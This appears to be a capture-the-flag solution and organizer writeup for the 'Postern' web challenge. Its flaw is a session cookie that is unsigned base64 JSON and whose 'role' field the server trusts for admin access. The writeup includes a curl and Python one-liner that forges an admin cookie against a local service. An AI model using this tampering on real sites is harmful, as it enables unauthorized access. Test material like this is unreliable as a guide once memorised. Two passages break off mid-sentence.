# Postern — solution

Run commands from this challenge's title directory. Python dependencies, when needed, are in `solution/requirements.txt`.

In one terminal, run the local challenge service:

```bash
python solution/runtime/app.py
```

In another terminal, run the solver:

```bash
python solution/solve.py --url http://127.0.0.1:8000
```

`accepted_flags.txt` records the accepted event answers. Locally reproduced services use their source defaults unless a flag is supplied through the documented environment variable; those demo answers can differ from the event answer.

# Postern — organizer writeup

**Category:** web · **Band:** Easy (honest; justified below) · **Flag:** `zerosecurectf{...}`


## The flaw

`challenge/app.py` issues a session cookie on `POST /login`:

```python
session = {"uid": GUEST_UID, "user": name, "role": "member"}
resp.set_cookie("session", encode_cookie(session), httponly=False, samesite="Lax")
```

`encode_cookie` is just `base64.urlsafe_b64encode(json.dumps(...))` — there is no
signature, MAC, or server-side session store. On `GET /lobby` the server reads
the role straight out of the cookie and trusts it:

```python
role = str(sess.get("role", "member"))
if role == "admin":
    return html(LOBBY_ADMIN.format(..., flag=FLAG), headers={"X-Flag-Source": "live-admin"})
```

That is client-trusted authorization: **CWE-302** (Authentication Bypass by
Assumption), **CWE-565** (Reliance on Cookies without Validation and Integrity),
OWASP Top 10 **A01:2021 Broken Access Control**.


## Intended solve (minutes)

1. `POST /login` → receive `session=<base64 of JSON>`.
2. base64-decode → `{"role":"member",...}`; change `member` → `admin`;
   base64-encode again.
3. `GET /lobby` with the tampered cookie → the administrators' lobby renders the
   flag. `solution/solve.py` does exactly this with the stdlib only.

You can do it by hand in the browser devtools (edit the cookie, reload `/lobby`)
or with `curl`:

```bash
C=$(curl -s -i -X POST --data user=guest http://127.0.0.1:8000/login | grep -i set-cookie | sed 's/.*session=\([^;]*\).*/\1/')
python3 -c "import base64,json,sys;d=base64.urlsafe_b64decode(sys.argv[1]+'==');o=json.loads(d);o['role']='admin';print(base64.urlsafe_b64encode(json.dumps(o,separators=(',',':'),sort_keys=True).encode()).decode())" "$C"
# then: curl -s --cookie "session=<forged>" http://127.0.0.1:8000/lobby
```


## Why the band is honestly EASY

- **One flaw, in plain sight, no chaining.** White-box source; the vulnerable
  line is a single trusted `sess.get("role")`. `difficulty_axes` are all 1
  except authenticity.
- **No tooling beyond base64/JSON.** No lattice, no race, no protocol desync.
- **Guessing is not required.** `/whoami` echoes the decoded cookie, so the
  cookie's shape (`uid/user/role`) is handed to the player; the only move is to
  change the value you can already see.
- It is **not a gimme**: the flag is absent from `/`, `/robots.txt`, `/whoami`,
  and a normal member's `/lobby`. A player who never inspects or edits the cookie


## Decoy (the single bounded §7 decoy)

The members' lobby shows a STAGING ENVIRONMENT BANNER:
`zer0securectf{staging_banner_<seed8>_not_valid}`. It is flag-*shaped* but begins
`zer0securectf{` (digit zero), so it **cannot** match the published format
`^zerosecurectf\{[a-z0-9_]+\}$`. A player who grabs the first flag-looking string
submits an invalid flag; the real one requires the role flip. The test asserts
the decoy is present, differs from the real flag, and fails the format regex.


## Acceptance

member-lobby/whoami no-leak, decoy rejectable, load-bearing flaw, determinism).
